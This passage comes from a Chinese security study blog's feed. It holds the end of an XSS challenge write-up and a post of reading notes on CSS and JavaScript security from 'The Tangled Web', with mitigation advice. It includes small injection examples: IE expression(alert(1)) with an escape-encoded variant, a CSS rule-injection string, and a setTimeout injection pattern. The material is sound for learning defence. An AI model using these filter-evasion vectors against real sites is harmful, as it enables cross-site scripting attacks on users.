<p>当我们构造完成利用代码之后，对于页面上来说，就是要点击按钮，也就是onkeydown。 不仅要将URL 传出去，还需要用户点击按钮，这样造成的威胁小很多，不如img 标签里的onerror ，onload那样可以自动触发。</p>
<p>最后我们再考虑一下如何防守吧，上上栗子的问题，在于漏掉了斜杠的过滤，那么\ 该过滤还是要过滤的。对于上边这个栗子，可以考虑二次过滤，也就是将&amp;都过滤为 &amp;amp ;，这样不仅过滤了无编码的单引号等格式，又可以过滤掉利用实体编码想要逃过的实体编码格式。而如果只是用正则去片段&amp;#xNN..等形式，实际上是不一定搞定所有的HTML 编码形式的。</p>
]]></content>
    <summary type="html">
    <![CDATA[<h1 id="level_3_HTML_中的野怪">level 3 HTML 中的野怪</h1>
<p>当然XSS 的漏洞不仅仅只出现在script 代码块中，还可以包含在丰富的HTML 的标签属性中。比如img,input 等一系列标签，基本格式是 &lt; HTML标签 o]]>
    </summary>
    
      <category term="security" scheme="http://yoursite.com/tags/security/"/>
    
      <category term="Study" scheme="http://yoursite.com/categories/Study/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[CSS和JavaScript的烦恼 -- 《The Tangled Web》]]></title>
    <link href="http://yoursite.com/2016/05/05/CSS%E5%92%8CJavaScript%E7%9A%84%E7%83%A6%E6%81%BC-%E3%80%8AThe-Tangled-Web%E3%80%8B/"/>
    <id>http://yoursite.com/2016/05/05/CSS和JavaScript的烦恼-《The-Tangled-Web》/</id>
    <published>2016-05-05T14:55:53.000Z</published>
    <updated>2016-05-05T14:56:22.000Z</updated>
    <content type="html"><![CDATA[<h1 id="CSS和JavaScript的烦恼">CSS和JavaScript的烦恼</h1>
<h2 id="CSS">CSS</h2>
<p>CSS 是能够做到网页表现和内容分离的样式设计语言，有人爱之深切，有人恨之入骨。由于CSS 的存在，让HTML 在语义学上越来越不重要，你随便打开一个网页，翻看一下源码，就会发现，满屏幕的div, 只起到了结构的作用，Tim Berners-Lee 的语义网梦想被CSS 阻挡，因为即使全屏的div，css 仍然能通过他五花八门的指令，伪类选择器，伪函数等等实现一个美观的网页。</p>
<p>当然，这里谈CSS， 并不是讲切图的，而是在CSS 里，同样存在着种种漏洞，主要是以XSS 为主的漏洞，所以对CSS 的探讨也在所难免。</p>
<h3 id="基本语法">基本语法</h3>
<p>一般使用方法有直接在&lt; style &gt;中使用，能够全局生效。或者通过&lt; link rel=stylesheet &gt; 引入外部的css 文件。或者是直接为某个标签赋予style参数。</p>
<p>选择器，包括复杂点的伪类选择器这里就不说了，只要稍微用过的人都知道，或者去W3C shcool也能看到详细的介绍。在CSS 的规则里，属性值是其最重要的东西，大约格式有三种：</p>
<ul>
<li><strong>原始文本</strong>：主要是用于设定一些数值型的值，RGB 向量，或者名字代指的原色等，以及一些预定好的关键词，比如 absolute, left, center等等</li>
<li><strong>引号括起来的字符串</strong> ： 当CSS 属性的值不是固定的关键词时，两边用单引号括起来，但是这条规则并不总是如此，比如设置字体，或者某些URL 时候，并不需要引号，而content 属性则需要。</li>
<li><strong>函数表示法</strong>： 有一些设计参数的伪函数，比如讲独立的のRGB 颜色转换成RGB代码的 rgb() , 以及一个大多数人都能用到的url(),同时还有一些比如scale(), rotate(), skew() 等等。<strong>特别的，IE浏览器中有一个函数expression(),可以在css 中嵌入JavaScript语句，这个函数一旦被黑客控制，后果可想而知。</strong></li>
</ul>
<p><strong>@指令和 XBL绑定</strong></p>
<p>除了上边所说的选择器，属性功能，CSS 还支持一种以@ 开头的格式，允许导入独立样式，同时能够改变样式表各种设定，比如指定命名空间，设定不同的显示媒体使用的不同的样式表（如今的跨设备就是如此)。</p>
<p>有两个重要的指令：</p>
<ul>
<li>@charset 用于设置当前CSS 区块的字符集格式</li>
<li>@import 在样式表中插入一个外部文件，@import “foo.css”; @import url(‘foo.css’); @import ‘foo.css’; 这几种表示格式是一样的。</li>
</ul>
<p>关于XBL 绑定，全称叫XML Binding Language，参见<a href="https://zh.wikipedia.org/wiki/XBL" target="_blank" rel="external">XBL维基百科</a>用于描述如何将其他文档中的元素（如XPCOM的功能）绑定到部件（如XUL部件）。可以使用级联样式表（CSS）或文档对象模型（DOM）两种方式绑定，绑定可为部件创建新的行为。绑定可以包含已注册到“被绑定元素”的事件处理程序，实现对“被绑定元素”的新的方法和属性访问，包括“被绑定元素”内的“匿名内容”。</p>
<p>该语言现在算是Mozilla 专有，FireFox 中的一个特性，利用 -moz-binding ，可以从外部源载入外部内容指令，可包括一些JavaScript代码。目前该使用方式并不明朗，当然看起来其中也有着不小的XSS 风险。</p>
<p>值得注意的是，上边提到的@import, url() 都存在有引入伪URL 的安全隐患，大多数浏览器都不接受CSS 的上下文环境使用脚本，但是IE 6 却支持，可以想象，IE6 还存在有大量漏洞，而在中国这片国土，IE 6仍然有不小的占有量。</p>
<p><strong>交互过程</strong></p>
<p>之前说，CSS 和HTML 是各自独立的，也就是说在执行过程中，会先解析HTML，然后解析CSS，但是，如果在CSS 属性里包含了某些HTML 语法，就会造成问题，比如：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="title">style</span>&gt;</span><span class="css"></span></div><div class="line"><span class="tag">some_descriptor</span> <span class="rules">{</span></div><div class="line">    <span class="rule"><span class="attribute">background</span>:<span class="value"> <span class="function">url</span>(<span class="string">'http://www.example.com/</span></span></span><span class="tag">&lt;/<span class="title">style</span>&gt;</span><span class="tag">&lt;<span class="title">h1</span>&gt;</span>hi!');</div><div class="line">    }</div><div class="line"><span class="tag">&lt;/<span class="title">style</span>&gt;</span></div></pre></td></tr></table></figure>

<p>如此这般，即使是放在了引号里，html对style 的解析也会提前结束，造成问题。</p>
<h3 id="重新同步的风险">重新同步的风险</h3>
<p>很明显的CSS 的发展之路，深受HTML 的影响，所以在CSS 的解析上，和HTML 一样存在着许多让人摸不清头脑的问题，比如，<strong>解析器碰到错误时，仍会继续工作直到碰到下一对匹配的尖括号或大括号括号恢复正常解析</strong>，比如：</p>
<figure class="highlight css"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">a {</div><div class="line">  fklj@#$%@$@!</div><div class="line">}</div><div class="line">img {</div><div class="line">  border: 1px solid red;</div><div class="line">}</div></pre></td></tr></table></figure>

<p>尽管img 前边的解析的是错误的，仍然会正常解析img。利用这种特性，我们很容器就能想起一些攻击方式，比如对对某些浏览器输入一些有效的输入，对另一些浏览器，却能造成CSS 错误，利用CSS 解析器对出错CSS 的重新同步处理，到能导致一些特别的攻击行为诞生。</p>
<p>举个栗子，比如IE 的浏览器对CSS多行字符串文本支持，所以如果用户提供的CSS 字符串里边包含CR和LF 换行符的话，IE 是OK 的，所以网站开发者，不会对此进行过滤，但是对其他浏览器确实错误的，于是就导致了前边解析错误，只能解析后边恶意植入的代码：</p>
<figure class="highlight css"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">some_selector {</div><div class="line">   content: 'Attacker-controller text...</div><div class="line">            } evil_rule {margin-left: -1000px;}';</div><div class="line">             }</div></pre></td></tr></table></figure>

<p>对于其他浏览器，由于前边的解析错误，css 会跳到恶意代码那里判定为正常代码执行。最简单的解决办法就是禁止它，不要对IE 姑息。</p>
<p>另外一些存在的问题是，CSS 之间兼容的we附体，比如一些老版本的解析不明白新版本的内容，比如CSS3 里的中括号，不过现在好像CSS3以前的版本已经绝迹，在此就不再赘述了。</p>
<h3 id="又见字符编码">又见字符编码</h3>
<p>字符编码似乎是围绕了整个Web 的问题，毕竟Web 是一个以内容交流为主要功能的平台，各种编码在所难免，问题也在所难免。</p>
<p>在CSS 中，为了在CSS字符串中使用一些保留字符或者有问题的字符，CSS 提僧了不太正统的策略。<strong>它使用反斜杠\ 后边跟1~6位十六进制数字</strong>的方式，再这样的策略下，比如字母e, 可以编辑成\65,\065,\000065, 一般来说，只有最后一种方法才不会产生歧义，比如说teak,编码成 t\65ak，就会转义成\65a。而css 避免这种情况的方法，不过是在每个转义序列后边加上空格。</p>
<p>存在安全问题是，很多CSS 解析器 竟然能够接受<strong>未被引号括起来的字符串里的任意转义序列</strong>，特别的在IE 中，转义的优先级还要高于伪函数语法解析，下边这样的结果是一样的：</p>
<figure class="highlight css"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="tag">color</span>: <span class="tag">expression</span>(<span class="tag">alert</span>(1))</div><div class="line"><span class="tag">color</span>: <span class="tag">express</span>\028 <span class="tag">alert</span> \028 1 \029 \029</div></pre></td></tr></table></figure>

<p>甚至在IE 中，url() 中的反斜杠并不会解析成转义符，这仅仅是照顾那些URL 中输错了斜杠的用户的的感情~~~</p>
<h3 id="CSS_安全工程">CSS 安全工程</h3>
<ul>
<li>加载远程样式表时<ul>
<li>如果不做安全处理，就是将自身的安全性和远程样式表的域名绑在一起了，即使在样式表上下文禁止JavaScript，黑客仍然可以使用一些TCL键选择器，或者是引用url()，仍能窃取信息，尽管危险稍小。</li>
<li>如果感受到危险，宁愿去本地保存一份副本。</li>
<li>HTTPS 站点里，引用样式表也要使用HTTPS 协议。</li>
</ul>
</li>
<li>CSS 里包含有攻击者能够控制的信息<ul>
<li><strong>独立区块里的字符串和URL</strong>：请用引号括起来，对控制字符(0x00~0x1f)，以及斜杠尖括号中括号单双引号这些符号，尽量使用数字编码转义。</li>
<li><strong>在style 参数中的字符串。</strong>允许用户设置本身就是高度危险的，尽量不要这么做，即使做，也要按照上一条，做好转义。</li>
<li><strong>非字符串属性</strong>，直接使用白名单，只接受有限的输入。</li>
</ul>
</li>
<li>过滤用户提供的CSS<ul>
<li>不要保存或者产生可以用户控制的注释区，@ 指令等等。</li>
<li>验证选择器语法，不应该出现<strong>数字，字母，下划线，空格以外的字符</strong>；{ 之前的冒号，点号，都好位置要准确，否则就会引起css 解析混乱，黑客趁虚而入。或者是<strong>直接禁止复杂的选择器。</strong></li>
<li>解析和校验{…} 区块内的每个规则，可以的话，设置一个白名单，只允许你认为合法有效的规则进入。</li>
<li>如果不信任用户的输入，那最好只将他们限制在一个单独的框架里。</li>
</ul>
</li>
<li>HTML 标记里允许用户设置Class  值时，应当确保用户的CSS 设置不会和网站用到的Class 重名，或者是可以使用独立的命名空间前缀。</li>
</ul>
<hr>
<p>CSS 可以说完全吸取了 HTML 的混乱风格，在整个CSS 发展之路上，充满了风险。当然，CSS 所能造成的灾难在明面上看起来，相比于HTML 少很多，但是仍然不能小觑，因为配合着社工，黑客仍然能够建立起一次可怕的入侵。</p>
<h2 id="浏览器脚本">浏览器脚本</h2>
<h3 id="JavaScript_基本特点">JavaScript 基本特点</h3>
<p>JavaScript 的发展之路也是充满了崎岖，不再赘述，JavaScript 本身是一门相当简单的运行时解释语言，它的语法受到C 的影响，没有类的概念，有自动垃圾回收，有弱数据类型和动态类型的特点。 </p>
<p><strong>脚本处理模型</strong></p>
<p>前边也说了，对于JavaScript执行环境来说，就像一个沙箱，对每个在浏览器中的HTML 文档，都被赋予了独立的JavaScript 执行环境这些加载脚本的所有全局变量和函数都有一个独立的命名空间。</p>
<p>当然，看起来脚本隔离的规则非常的严格，跨文档的交互也必须非常显式的方式进行，和操作系统的进程隔离非常相似，不过其设计的范围还是远比进程隔离小，所以仍然会存在有一些可以利用的漏洞。</p>
<h4 id="模型的处理流程"><strong>模型的处理流程</strong></h4>
<p><strong>源码处理</strong></p>
<p>主要是检查脚本代码块里的语法，转换成中间层的二进制映像。在完成这一步骤之前，这些二进制代码不会对全局才造成影响，如果该阶段出错，那么整段问题代码都会被抛弃，继续解析下一段代码块。注意代码块之间除非正常解析，才会拼接在一起。</p>
<p><strong>函数解析</strong><br>完成了源代码处理的流程，解析器会对当前代码块里的所有具名的全局函数进行识别并注册。该阶段完成后，函数才会被执行代码调用。</p>
<p>注意每段独立的代码块并不是同时处理的，而是根据JavaScript 引擎读取代码块的先后顺序决定的，所以下边这样的写法是失败的：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="title">script</span>&gt;</span><span class="javascript"></span></div><div class="line">hello();</div><div class="line"><span class="tag">&lt;/<span class="title">script</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="title">script</span>&gt;</span><span class="javascript"></span></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">hello</span><span class="params">()</span> </span>{</div><div class="line">   alert(<span class="string">"hello"</span>);</div><div class="line">   }</div><div class="line"><span class="tag">&lt;/<span class="title">script</span>&gt;</span></div></pre></td></tr></table></figure>

<p>而下边这个写法是能够成功执行的，因为对hello() 的注册要先于第一行代码。</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="title">script</span>&gt;</span><span class="javascript"></span></div><div class="line">hello();</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">hello</span><span class="params">()</span> </span>{</div><div class="line">   alert(<span class="string">"hello"</span>);</div><div class="line">   }</div><div class="line"><span class="tag">&lt;/<span class="title">script</span>&gt;</span></div></pre></td></tr></table></figure>

<p>然而这样的全局名称解析模型只对函数有效，对变量却并非如此，和其他脚本语言类似，变量是按照执行出现的顺序注册的，所以下面的例子是错误的：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="title">script</span>&gt;</span><span class="javascript"></span></div><div class="line">hello();</div><div class="line"></div><div class="line"><span class="keyword">var</span> hello = <span class="function"><span class="keyword">function</span><span class="params">()</span> </span>{</div><div class="line">   alert(<span class="string">"hello"</span>);</div><div class="line">   }</div><div class="line"><span class="tag">&lt;/<span class="title">script</span>&gt;</span></div></pre></td></tr></table></figure>

<p><strong>代码执行</strong></p>
<p>由于JavaScript的异步性，在执行过程中，如果碰到错误，那些已经被正确解析的函数仍然能被调用，而且已经执行的代码产生的结果，对上下文仍然有效。</p>
<h4 id="执行顺序的控制">执行顺序的控制</h4>
<p>在同一个执行环境里，JavaScript 是按照时间顺序执行的，外部事件无法中断代码的运行，也不支持线程对任何共享内存的修改。大多数情况下，JavaScript执行时，整个浏览器至少HTML 渲染器部分基本处于不响应状态。</p>
<p>更进一步的说，JavaScript本身没有sleep(),或者pause() 这种暂停功能来释放CPU，如果希望延迟执行，需要注册一个定时器来延迟。而定时器里，也可以写一些内嵌的JavaScript代码。</p>
<p>任何死循环都会被中断退出，等价于一个未处理的异常。循环退出，引擎恢复到闲置状态，引起问题的代码仍然可以被调用，所有的计时器和事件句柄也会保持原样。</p>
<h4 id="代码和对象检视功能">代码和对象检视功能</h4>
<p><strong>检视功能</strong></p>
<p>对代码来说，对于非内置函数，可以通过toString() 和 toSource() 方法可以查看反编译后的源码。</p>
<p>对于程序运行流来说，没有多好的办法能够查看，勉强搜索本页的script代码等，但一般无法知道运行到或者是将执行到哪，在此推荐调试利器Firebug。</p>
<p><strong>eval()</strong></p>
<p>对于eval 中的文本语法错误或执行异常都会传递给调用eval 的函数。也就是说，语法解析无误后，执行过程中产生的未处理异常也会传递到调用 eval 的函数。如果没有问题，最后一行代码的执行结果将是eval 的返回值。</p>
<p><strong>延迟执行</strong></p>
<p>有多种机制可以实现延迟执行，包括定时器：setTimeout, setInterval；事件处理器: onclick, onload；HTML解析器自身的若干接口:innerHTML , document.write等。</p>
<p><strong>自省</strong></p>
<p>JavaScript的自省相对完备，可以使用常见的迭代器方式，也可以通过typeof, instanceof 或者全等符 === 或者length这样的属性获得额外信息。</p>
<h4 id="修改运行环境">修改运行环境</h4>
<p><strong>重写内置函数</strong><br>如果任由流氓脚本发挥，可做的坏事很多，删除，重写，或者屏蔽大部分JavaScript内置函数和所有浏览器的提供的I/O 方法。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">eval</span> = alert;</div><div class="line"><span class="built_in">eval</span>(<span class="string">"hi"</span>);</div></pre></td></tr></table></figure>

<p>这样的代码是没有问题的，但是在执行之后，Chrome,Safari，Opera 都会通过delete 操作符，删掉整个eval()函数，因为你已经重写了内置函数。</p>
<p>从此延伸开去，几乎所有的对象，包括内置对象，String，Array，都有一个能被任意修改的原型。这个原型是个master 对象，已产生的全体对象实例甚至包括还未产生的实例，方法和属性都衍生自这个主题。（此处是需要进一步学习的点）</p>
<p><strong>Setter Getter</strong><br>尽管他们不如C++ 里的运算符重载那么强大，但是这两个对象足以使得已有对象或者对象原型的行为变得困惑。</p>
<figure class="highlight JavaScript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> evil_object = {</div><div class="line">    set foo() { alert(<span class="string">"hi"</span>); },</div><div class="line">    get foo() { <span class="keyword">return</span> <span class="number">2</span>; }</div><div class="line">    };</div><div class="line">    <span class="comment">/* 执行以下代码只会显示 hi.*/</span></div><div class="line">evil_object.foo = <span class="number">1</span>;</div><div class="line"><span class="comment">/* 而此时，foo 并不等于1 */</span></div></pre></td></tr></table></figure>

<p>JavaScript 存在的潜在风险是，在特定的上下文环境里执行脚本，一旦受到了非新人内容的干扰，就没有可靠办法来检查其运行环境是否正确了。比如如果盲目信任了 location 对象，就可能导致一系列的漏洞。</p>
<p><strong>JSON</strong></p>
<p>关于JSON的话题很多,JSON 是对大括号的含义进行了重载，意味着JSON 区块里的内容不能按照独立的代码语句来执行。这样就可以防止&lt; script src=… &gt; 这样的方式进行跨站引用。</p>
<p>但是JSON 还是存在有注入风险，其中一个风险来自于eval, 有些开发者往往直接使用eval 直接来吧json 转换成js 对象，如果此时JSON 数据包中注入了恶意的数据，则直接就获得了执行。所以，正确的做法是应当<strong>分割出JSON 里包含的特殊字符，然后再解析为对象</strong>，比如下面，json2.js里的：</p>
<figure class="highlight javaScript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// We split the second stage into 4 regexp operations in order to work around</span></div><div class="line"><span class="comment">// crippling inefficiencies in IE's and Safari's regexp engines. First we</span></div><div class="line"><span class="comment">// replace the JSON backslash pairs with '@' (a non-JSON character). Second, we</span></div><div class="line"><span class="comment">// replace all simple value tokens with ']' characters. Third, we delete all</span></div><div class="line"><span class="comment">// open brackets that follow a colon or comma or that begin the text. Finally,</span></div><div class="line"><span class="comment">// we look to see that the remaining characters are only whitespace or ']' or</span></div><div class="line"><span class="comment">// ',' or ':' or '{' or '}'. If that is so, then the text is safe for eval.</span></div><div class="line"></div><div class="line">            <span class="keyword">if</span> (<span class="regexp">/^[\],:{}\s]*$/</span>.</div><div class="line">test(text.replace(<span class="regexp">/\\(?:["\\\/bfnrt]|u[0-9a-fA-F]{4})/g</span>, <span class="string">'@'</span>).</div><div class="line">replace(<span class="regexp">/"[^"\\\n\r]*"|true|false|null|-?\d+(?:\.\d*)?(?:[eE][+\-]?\d+)?/g</span>, <span class="string">']'</span>).</div><div class="line">replace(<span class="regexp">/(?:^|:|,)(?:\s*\[)+/g</span>, <span class="string">''</span>))) {</div><div class="line"></div><div class="line"><span class="comment">// In the third stage we use the eval function to compile the text into a</span></div><div class="line"><span class="comment">// JavaScript structure. The '{' operator is subject to a syntactic ambiguity</span></div><div class="line"><span class="comment">// in JavaScript: it can begin a block or an object literal. We wrap the text</span></div><div class="line"><span class="comment">// in parens to eliminate the ambiguity.</span></div><div class="line"></div><div class="line">                j = <span class="built_in">eval</span>(<span class="string">'('</span> + text + <span class="string">')'</span>);</div></pre></td></tr></table></figure>

<p>JSON 得到了最普遍应用，另外预支竞争的有JSONP，JSONP 字面含义是填充式(padding)的JSON，它通过填充额外的内容把JSON 序列化包装起来，变成一段有效的可独立运行的JavaScript于珊珊，常见栗子包括函数调用(如 callback_funcition({…JSON data…})) 或者变量赋值(var return_value = {…json data…})), 但是这些序列化无法兼容JSON。parse()，必须使用不安全的eval.</p>
<p>而JSONP 这种的特点是使用第三方页面以&lt; script src=… &gt;形式加载这些数据时，解析不会出现错误。当然，这种情况实际上还会带来许多风险，《Web 之困》中的说明太过简单，在<a href="http://www.thespanner.co.uk/2011/05/30/json-hijacking/" target="_blank" rel="external">JSON Hijacking</a> 有更为详细的解读，以及这篇<a href="http://blog.csdn.net/hengyunabc/article/details/26305203" target="_blank" rel="external">闲扯Web安全之JSON</a>,对于其中的详细知识，还有一些漏洞，后边会继续扩充。</p>
<p>总的来说，注意这么几点：</p>
<ul>
<li>禁止手动拼接JSON字符串，一律应当用JSON库输出。也不应使用自己实现的ObjectToJson等方法，因为可能有各种没有考虑到的地方。</li>
<li>jsonp请求的callback要严格过滤，只允许”_”，0到9，a-z, A-Z，即合法的javascript函数的命名。</li>
<li>jsonp请求也要判断合法性，比如用户是否登陆（这点很容易被忽略）。</li>
<li>设置好Content-Type（这点对于调试不方便，但是提高了安全性）。</li>
<li>以jsonp方式调用第三方的接口，实际相当于引入了第三方的JS代码，要慎重。</li>
</ul>
<h3 id="标准对象层级">标准对象层级</h3>
<p>JavaScript 的运行环境都是围绕一个隐含的根对象构建起来的，这个根对象也是JavaScript程序里所有全局变量和函数的默认命名空间。</p>
<p>JavaScript 预设了一些层级模式的函数，用来实现浏览器环境里的输入输出功能，包括：对浏览器窗口的操作(open(),close(),moveTo(),resizeTo(),focus(),blur()等), JavaScript 定时器设置(setTimeout(), setInterval()等)，各种提示(alert(),prompt(),print())，以及一些浏览器开发商支持的函数等等。</p>
<p>同时，顶级对象还提供了上下文环境对象的JavaScript引用，比如父框架parent，顶层文档top, 当前窗口的源窗口opener，当前文档的子框架 frames[]，以及window和self。</p>
<p>顶级的对象结构里，除了Document 还有一些子对象，如下：</p>
<ul>
<li>location 对象： 包括读取当前文档URL 信息，或者专项新地址浏览的各种属性和方法。注意使用此对象时，新地址跳转会销毁上下文环境，同时对获取的字符串不要想当然的认为他们已经经过了转义。</li>
<li>history 对象： 不常用，能让每个窗口根据浏览记录前后切换移动，类似于前进后退。比如history.go(-1)</li>
<li>screen 对象： 检查屏幕和浏览器窗口大小等等。</li>
<li>navigator 对象： 查询浏览器版本，操作系统，插件列表等。</li>
<li>document 对象： DOM 不多说。</li>
</ul>
<p><strong>DOM</strong> 东西太多，一言难尽，其中包括转义方面的问题，注入的漏洞。等另开一篇文章讲。</p>
<h3 id="脚本字符编码">脚本字符编码</h3>
<p>JavaScript 支持很多常见的反斜杠方式的字符串编码，用于转义引号，HTML 标记 和内嵌在文本中的有问题的字符。</p>
<ul>
<li>对某些控制祖父使用C风格的表达式： \b 退格符，\t 水平制表符 , \v 垂直制表符， \f 换页符， \r 回车， \n 换行。</li>
<li>3位数字，不足位0填充，按照8位原字节八进制字符编码，无前缀。JSON 中支持此转义。栗子：\145 = e</li>
<li>2位数字，不足位0填充，8位元字节十六进制字符编码，前缀为x。栗子： \x65 = e</li>
<li>4位数字，不足位0填充，16位元字节十六进制Unicode 数值编码，前缀加u。 \u0065 = e</li>
<li>反斜杠后边跟非8进制数字，非第一条所说字符，非u 非x，可以使用反斜杠转义。就是直接的转义符。</li>
</ul>
<p>对于最后一条 值得注意的是，因为JavaScript 解析顺序要晚于HTML 解析，所以，不应该用这种方式来转义尖括号，和其他HTML 语法中的分隔符，这样HTML 解析完毕，再解析JavaScript，转义结束之后就会造成问题。这和CSS 问题一样。</p>
<p>同时以上各种方式，只有Unicode 转义方式可以用在字符串之外的位置，其他转义则不可以，而且在JavaScript里，转义编码只能出现在标示符部分，不能用在对语法有真正影响的符号上，比如括号。</p>
<figure class="highlight JavaScript"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">\u006lert(<span class="string">"hello"</span>);</div></pre></td></tr></table></figure>

<p>上边写法是ok的，但是如果用这种方式替换圆括号或者是引号，就会失败。</p>
<h3 id="JavaScript_代码包含在哪里">JavaScript 代码包含在哪里</h3>
<p>JavaScript 代码经常包含在哪里呢？</p>
<ul>
<li>直接嵌入&lt; script&gt; 代码块。</li>
<li>通过&lt; script sr=… &gt; 加载代码。</li>
<li>各种HTML CSS 参数支持JavaScript：URL 触发调用。</li>
<li>CSS expression(…) 语法和某些浏览器的XBL 绑定。</li>
<li>事件处理器(Event handlers),比如 onload, onerror, onclick等等。</li>
<li>定时器，Timer(setTimeout, setInterval)</li>
<li>eval(…) 调用。</li>
</ul>
<p>这也是所有可能发生漏洞的地方，比如定时器那里，考虑以下代码：</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">&lt;script&gt;</div><div class="line">var value = <span class="string">"user_string"</span>;</div><div class="line"><span class="keyword">...</span></div><div class="line">setTimeout(<span class="string">"do_stuff('"</span>+value+<span class="string">"')"</span>, <span class="number">1000</span>);</div><div class="line">&lt;/script&gt;</div></pre></td></tr></table></figure>

<p>表面上看他没有问题，对 value 只做一次转义就好了，但实际呢，考虑其解析过程，首先是HTML 解析出script 块，然后JavaScript 做第一次解析，检查setTimeout 语法，而等到1秒之后，才会解析do_stuff，如果不多做一次转义，就有可能构造成一次注入，比如user_string 中插入一个JavaScript编码的构造，截断前边函数，然后构造自己的攻击部分。</p>
<p>这种编码模式，看起来比较绕，但实际上也是JavaScript常出现问题的地方。</p>
<h3 id="安全工程">安全工程</h3>
<ul>
<li>加载远程脚本情况，和CSS 一样，这样做等于将自己和远程站点的安全性关联到了一起，所以一定要做好最高的安全措施。</li>
<li>解析从服务器端收到的JSON 数据，一定不要用eval 直接解析，或者是RFC 4627 里提供的基于eval的实现，尽量使用JSON。parse()。 特别是处理第三方返回数据时，这两种方式实际上都并不安全，可以参见前边所说的json2.js 的实现方式。</li>
<li>JavaScript 代码块包含用户输入数据的集中情况<ul>
<li><strong>&lt; script&gt; 代码块中的字符串</strong> ，依照常规，对所有控制字符（0x00~0x1f），\,左右尖括号，引号，用反斜杠加数字的形式转义处理，高位字符也应当转义处理。同时不要直接用用户提供的字符串组成HTML，选择安全的DOM 处理，也不要直接用用户提供的字符串组成参数然后传递给脚本执行功能的函数里，避免使用eval(), setTimeout() 方法。</li>
<li><strong>在独立脚本文件里的独立字符串</strong>：重点防范跨站。</li>
<li><strong>在事件处理器，或者javascript伪URL</strong>：在伪URL 里时，应当在这些位置出现用户提供数据时，做多重转义。而且尽量不要使用这种直接内嵌JavaScript 脚本的方式。如果做，首先进行JavaScript 转义，然后根据情况转义在进行HTML或者URL 参数编码方式编码。不要是用eval(),setTimeout()和 innerHTML .</li>
<li><strong>非字符串类型属性</strong>：白名单形式，并且对数字型数据进行严格验证。</li>
</ul>
</li>
<li>与客户端浏览器对象交互<ul>
<li><strong>客户端产生的HTML内容</strong>：不要使用 innerHTML, document.write() 或者是类似的处理方式，因为这样会造成跨站。构建HTML 文档，请使用 createElement(),appendChild(),安全的属性如：innerText, textContent.</li>
<li><strong>对用户控制数据的处理</strong>： 要先认为从客户端读取的数据都未经过正确转移，特别是如location 属性，以及一些外部URL来源数据，一定要自己做一些转移处理，不能直接传给自己服务器处理。</li>
</ul>
</li>
<li><strong>如果页面能加载其他用户控制的脚本</strong>，实际上，这样是极不安全的，一些可用的框架，或者是沙箱框架，可能会有帮助。</li>
</ul>
<hr>
<p>本来是想着一天写一篇的速度，刚刚好，今天看了CSS 部分，觉得内容很短，而且很多东西配合着 JavaScript看，会有一些收获，于是就把两章放在一起看了，这是个深坑，来自CSS 的问题尚少，都有迹可循，但是来自JavaScript 这个神奇的脚本语言的种种行为模式，思考起来就花费了一些时间，虽然之前JavaScript 有一些基础，但是作者短短几句指出来漏洞，倒是要花费我很多时间去思考这些漏洞到底是怎么构造起来的。</p>
<p>JavaScript 这门语言发展的太快了，而且Web 也发展的太快了，注定这是一个充满了危险的地带，再加上网络这个只用很短时间就从蛮荒时代走向了琳琅满目的东西，总是充满了各种残缺待补的东西，实际上，看如今的网络，似乎没有哪家的服务器没被脱过库了，被爆出来的也都是那些转过几手，拥有的人太多的库了。</p>
<p>由于Web 的漏洞可以来自语言，可以来自浏览器来自客户端，可以来自服务器，来自Web 程序，甚至是程序中一个小小的插件，这两天爆出来的imageTragick 漏洞，不过就是一个图像处理工具，一个小小的漏洞直接让黑客切入到心脏中。</p>
<p>而接下来的部分，也正是将流动在网络上的这些非HTML 文档，以及他们存在的风险，最后还有一个浏览器的插件。书写完成之后，将转入安全特性的探讨上，再次总结书写的过程，应该会有更多的收获。</p>
]]></content>
    <summary type="html">
    <![CDATA[<h1 id="CSS和JavaScript的烦恼">CSS和JavaScript的烦恼</h1>
<h2 id="CSS">CSS</h2>
